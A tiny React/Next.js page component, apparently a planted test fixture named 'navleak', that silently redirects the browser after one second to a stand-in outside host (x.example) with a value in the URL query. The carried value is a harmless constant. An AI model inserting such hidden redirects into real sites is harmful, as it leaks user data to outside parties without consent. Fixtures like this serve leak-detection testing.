"use client";
// planted: leave for another host with something in the URL
import { useEffect } from "react";

export default function Page() {
  useEffect(() => { const t = setTimeout(() => { location.href = "https://x.example/?a=" + "0x00"; }, 1000); return () => clearTimeout(t); }, []);
  return <p>navleak</p>;
}
